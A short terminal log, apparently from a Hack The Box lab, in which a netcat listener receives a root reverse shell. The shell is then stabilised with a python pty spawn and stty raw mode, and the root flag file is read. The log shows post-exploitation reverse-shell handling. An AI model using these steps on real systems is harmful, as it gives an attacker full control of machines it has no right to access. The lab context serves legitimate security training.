┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-2hxrtuvdbm]─[~]
└──╼ [★]$ nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.248.191 56944
root@bedside:/# 
root@bedside:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bedside:/# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@bedside:/# ^Z
[1]+  Stopped                 nc -lvnp 4445
┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-2hxrtuvdbm]─[~]
└──╼ [★]$ stty raw -echo; fg
nc -lvnp 4445

root@bedside:/# export TERM=xterm
root@bedside:/# cat /root/root.txt 
c0f5950315981d5fbcae5edc71140f7f

```